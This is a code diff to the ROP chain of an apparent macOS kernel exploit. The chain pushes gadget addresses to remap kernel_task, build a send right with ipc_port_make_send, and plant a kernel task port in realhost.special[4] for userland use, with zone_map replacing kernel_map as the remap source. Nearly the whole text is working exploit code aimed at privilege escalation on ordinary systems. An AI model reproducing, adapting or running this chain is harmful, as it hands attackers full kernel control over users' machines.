@@ -106,10 +106,12 @@ int rop_gadgets(rop_t *rop, void *k)
                 SYM(vm_map_remap);
                 SYM(mach_vm_wire);
                 SYM(ipc_port_alloc_special);
+                SYM(ipc_port_make_send);
                 SYM(ipc_kobject_set);
                 SYM(ipc_space_kernel);
-                SYM(kernel_map);
                 SYM(kernel_task);
+                SYM(kernel_map);
+                SYM(zone_map);
                 SYM(realhost);
                 SYM(mac_policy_list);
                 SYM(hibernate_machine_init);
@@ -135,10 +137,12 @@ int rop_gadgets(rop_t *rop, void *k)
     ENSURE(vm_map_remap);
     ENSURE(mach_vm_wire);
     ENSURE(ipc_port_alloc_special);
+    ENSURE(ipc_port_make_send);
     ENSURE(ipc_kobject_set);
     ENSURE(ipc_space_kernel);
-    ENSURE(kernel_map);
     ENSURE(kernel_task);
+    ENSURE(kernel_map);
+    ENSURE(zone_map);
     ENSURE(realhost);
     ENSURE(mac_policy_list);
     ENSURE(hibernate_machine_init);
@@ -283,7 +287,7 @@ void rop_chain(rop_t *rop, uint64_t *buf, uint64_t addr)
     PUSH(rop->mov__rdi__rax_pop_rbp);                   // store old rbp to end of buffer
     PUSH(0xffffff80dead1002);                           // dummy rbp
 
-    // Pad our stack a bit, since we call functions later
+    // Pad our stack a bit, since we call functions from here on
     for(size_t i = 0; i < 0xa00 / (2 * s); ++i) // Can't afford much more than that
     {
         PUSH(rop->pop_rcx);                             // just whatever
@@ -311,31 +315,14 @@ void rop_chain(rop_t *rop, uint64_t *buf, uint64_t addr)
     PUSH(3 * sizeof(uint32_t));                         // rsi
     PUSH(rop->bzero);
 
-#if 0
-    // bring the kernel task port to userland:
-    // ipc_kobject_set(
-    //     realhost.special[4] = ipc_port_alloc_special(ipc_space_kernel),
-    //     IOMultiMemoryDescriptor::withDescriptors(
-    //         &IOMemoryDescriptor::withAddress(
-    //             kernel_task,
-    //             sizeof(task_t),
-    //             kIODirectionInOut | kIOMemoryBufferPageable
-    //         ),
-    //         1,
-    //         kIODirectionInOut,
-    //         false
-    //     )->map(kIOMapUnique)->getVirtualAddress(),
-    //     IKOT_TASK
-    // );
-#endif
     // bring the kernel task port to userland:
     // vm_map_remap(
     //     kernel_map,
     //     &remap_addr,
     //     sizeof(task_t),
-    //     0xfff,
+    //     0,
     //     VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR,
-    //     kernel_map,
+    //     zone_map,
     //     kernel_task,
     //     false,
     //     &dummy,
@@ -343,10 +330,9 @@ void rop_chain(rop_t *rop, uint64_t *buf, uint64_t addr)
     //     VM_INHERIT_NONE
     // );
     // mach_vm_wire(&realhost, kernel_map, remap_addr, sizeof(task_t), VM_PROT_READ | VM_PROT_WRITE);
-    // realhost.special[4] = ipc_port_alloc_special(ipc_space_kernel);
+    // realhost.special[4] = ipc_port_make_send(ipc_port_alloc_special(ipc_space_kernel));
     // ipc_kobject_set(realhost.special[4], remap_addr, IKOT_TASK);
 
-#if 1
     // vm_map_remap(...)
     PUSH(rop->pop_rdi);                                 // get kernel_task
     PUSH(rop->kernel_task);
@@ -369,10 +355,10 @@ void rop_chain(rop_t *rop, uint64_t *buf, uint64_t addr)
     PUSH(rop->pop_rdx);
     PUSH(1360);                                         // rdx = sizeof(task_t)
     PUSH(rop->pop_rcx);
-    PUSH(0xfff);                                        // rcx = mask
+    PUSH(0);                                            // rcx = mask
     PUSH(rop->pop_r8_pop_rbp);
     PUSH(0x100001);                                     // r8 = VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR
-    PUSH(rop->kernel_map + 0x38);                       // we actually need rbp for once
+    PUSH(rop->zone_map + 0x38);                         // we actually need rbp for once
     PUSH(rop->pop_rax);
     PUSH(rop->pop_rax);                                 // jumps over the address pushed by "call rax"
     PUSH(rop->mov_r9__rbp_0x38__call_rax);
@@ -410,48 +396,7 @@ void rop_chain(rop_t *rop, uint64_t *buf, uint64_t addr)
     PUSH(0xffffff80dead1012);                           // dummy rbp
     PUSH(rop->mach_vm_wire);
 
-#else
-    // desc = IOMemoryDescriptor::withAddress(kernel_task, sizeof(task_t), kIODirectionInOut | kIOMemoryBufferPageable)
-    PUSH(rop->pop_rdi);                                 // load *kernel_task to rdi
-    PUSH(rop->kernel_task);                             // rdi
-    PUSH(rop->mov_rax__rdi__pop_rbp);                   // dereference to rax
-    PUSH(0xffffff80dead100b);                           // dummy rbp
-    PUSH(rop->pop_rcx);
-    PUSH(rop->pop_rsi);                                 // rcx = next address
-    PUSH(rop->mov_rdi_rax_pop_rbp_jmp_rcx);             // move rax to rdi and call rcx
-    PUSH(0xffffff80dead100d);                           // dummy rbp
-    PUSH(1360);                                         // rsi = sizeof(task_t)
-    PUSH(rop->pop_rdx);                                 // get 3rd argument
-    PUSH(0x00000403);                                   // rdx = kIODirectionInOut | kIOMemoryBufferPageable
-    PUSH(rop->IOMemoryDescriptor_withAddress);
-    PUSH(rop->pop_rdi);                                 // load desc_addr to rdi
-    PUSH(desc_addr);
-    PUSH(rop->mov__rdi__rax_pop_rbp);                   // store to desc_addr
-    PUSH(0xffffff80dead100e);                           // dummy rbp
-
-    // multi_desc = IOMultiMemoryDescriptor::withDescriptors(&desc, 1, kIODirectionInOut, false)
-    PUSH(rop->pop_rsi);                                 // load args, rdi is set already
-    PUSH(1);                                            // rsi = 1
-    PUSH(rop->pop_rdx);
-    PUSH(3);                                            // rdx = kIODirectionInOut
-    PUSH(rop->pop_rcx);
-    PUSH(0);                                            // rcx = false
-    PUSH(rop->IOMultiMemoryDescriptor_withDescriptors);
-
-    // copy_task = multi_desc->map(kIOMapUnique)->getVirtualAddress()
-    PUSH(rop->pop_rcx);
-    PUSH(rop->pop_rsi);                                 // rcx = next address
-    PUSH(rop->mov_rdi_rax_pop_rbp_jmp_rcx);             // move rax to rdi and call rcx
-    PUSH(0xffffff80dead100f);                           // dummy rbp
-    PUSH(0x04000000);                                   // rsi = kIOMapUnique
-    PUSH(rop->IOMemoryDescriptor_map);
-    PUSH(rop->pop_rcx);
-    PUSH(rop->IOMemoryMap_getVirtualAddress);           // rcx = next address
-    PUSH(rop->mov_rdi_rax_pop_rbp_jmp_rcx);             // move rax to rdi and call rcx
-    PUSH(0xffffff80dead1011);                           // dummy rbp
-#endif
-
-    // realhost.special[4] = ipc_port_alloc_special(ipc_space_kernel);
+    // realhost.special[4] = ipc_port_make_send(ipc_port_alloc_special(ipc_space_kernel));
     PUSH(rop->pop_rdi);                                 // load *ipc_space_kernel to rdi
     PUSH(rop->ipc_space_kernel);                        // rdi
     PUSH(rop->mov_rax__rdi__pop_rbp);                   // dereference to rax
@@ -460,27 +405,31 @@ void rop_chain(rop_t *rop, uint64_t *buf, uint64_t addr)
     PUSH(rop->ipc_port_alloc_special);                  // rcx = next address
     PUSH(rop->mov_rdi_rax_pop_rbp_jmp_rcx);             // move rax to rdi and call rcx
     PUSH(0xffffff80dead1015);                           // dummy rbp
+    PUSH(rop->pop_rcx);
+    PUSH(rop->ipc_port_make_send);                      // rcx = next address
+    PUSH(rop->mov_rdi_rax_pop_rbp_jmp_rcx);             // move rax to rdi and call rcx
+    PUSH(0xffffff80dead1016);                           // dummy rbp
     PUSH(rop->pop_rdi);                                 // load address of realhost.special[4] to rdi
     PUSH(rop->realhost + 0x30);                         // rdi
     PUSH(rop->mov__rdi__rax_pop_rbp);                   // store to realhost.special[4]
-    PUSH(0xffffff80dead1016);                           // dummy rbp
+    PUSH(0xffffff80dead1017);                           // dummy rbp
 
     // ipc_kobject_set(realhost.special[4], remap_addr, IKOT_TASK);
     PUSH(rop->pop_rdi);                                 // load remap_addr
     PUSH(remap_addr);
     PUSH(rop->mov_rax__rdi__pop_rbp);
-    PUSH(0xffffff80dead1017);                           // dummy rbp
+    PUSH(0xffffff80dead1019);                           // dummy rbp
     PUSH(rop->pop_rcx);
     PUSH(rop->pop_rdi);                                 // rcx = load address of realhost.special[4] to rdi
     PUSH(rop->mov_rsi_rax_pop_rbp_jmp_rcx);             // move rax (remap_addr) to rsi and call rcx
-    PUSH(0xffffff80dead1019);                           // dummy rbp
+    PUSH(0xffffff80dead101a);                           // dummy rbp
     PUSH(rop->realhost + 0x30);                         // rdi
     PUSH(rop->mov_rax__rdi__pop_rbp);                   // dereference to rax
-    PUSH(0xffffff80dead101a);                           // dummy rbp
+    PUSH(0xffffff80dead101b);                           // dummy rbp
     PUSH(rop->pop_rcx);
     PUSH(rop->pop_rdx);                                 // rcx = next address
     PUSH(rop->mov_rdi_rax_pop_rbp_jmp_rcx);             // move rax to rdi and call rcx
-    PUSH(0xffffff80dead101b);                           // dummy rbp
+    PUSH(0xffffff80dead101d);                           // dummy rbp
     PUSH(2);                                            // rdx = IKOT_TASK
     PUSH(rop->ipc_kobject_set);
 
@@ -488,31 +437,31 @@ void rop_chain(rop_t *rop, uint64_t *buf, uint64_t addr)
     PUSH(rop->pop_rdi);                                 // load rdi
     PUSH(rop->kOSBooleanTrue);                          // load &kOSBooleanTrue to rdi
     PUSH(rop->mov_rax__rdi__pop_rbp);                   // dereference once
-    PUSH(0xffffff80dead101d);                           // dummy rbp
+    PUSH(0xffffff80dead101e);                           // dummy rbp
     PUSH(rop->pop_rcx);                                 // load next address to rcx
     PUSH(rop->mov_rax__rdi__pop_rbp);                   // dereference twice
     PUSH(rop->mov_rdi_rax_pop_rbp_jmp_rcx);             // move rax to rdi and call rcx
-    PUSH(0xffffff80dead101e);                           // dummy rbp
-    PUSH(0xffffff80dead101f);                           // another dummy rbp
+    PUSH(0xffffff80dead101f);                           // dummy rbp
+    PUSH(0xffffff80dead1021);                           // another dummy rbp
     PUSH(rop->pop_rdi);                                 // load address of buffer
     PUSH(base_addr);
     PUSH(rop->mov__rdi__rax_pop_rbp);                   // store kOSBooleanTrue to beginning of buffer
-    PUSH(0xffffff80dead1021);                           // dummy rbp
+    PUSH(0xffffff80dead1022);                           // dummy rbp
 
     // Return to original stack
     PUSH(rop->pop_rdi);                                 // load address where rbp was saved
     PUSH(old_rbp_addr);                                 // old rbp address
     PUSH(rop->mov_rax__rdi__pop_rbp);                   // dereference to rax
-    PUSH(0xffffff80dead1022);                           // dummy rbp
+    PUSH(0xffffff80dead1023);                           // dummy rbp
     PUSH(rop->pop_rdi);                                 // load OSArray::flushCollection stack size to rdi
     PUSH(0x28);                                         // OSArray::flushcollection stack size (4 regs + ret addr)
     PUSH(rop->sub_rax_rdi_pop_rbp);                     // calculate old rsp from old rbp
-    PUSH(0xffffff80dead1023);                           // dummy rbp
+    PUSH(0xffffff80dead1025);                           // dummy rbp
 
     PUSH(rop->pop_rcx);                                 // load next address
     PUSH(rop->pop_rdi);                                 // rcx = next address
     PUSH(rop->mov_rsi_rax_pop_rbp_jmp_rcx);             // move rax (old rsp) to rsi and call rcx
-    PUSH(0xffffff80dead1025);                           // dummy rbp
+    PUSH(0xffffff80dead1026);                           // dummy rbp
     // rcx (= pop_rdi) is called here:
     PUSH(rop->pop_rdi);                                 // rdi, address of something that jumps over 1 stack value
     PUSH(rop->mov_rsp_rsi_call_rdi);                    // goodbye
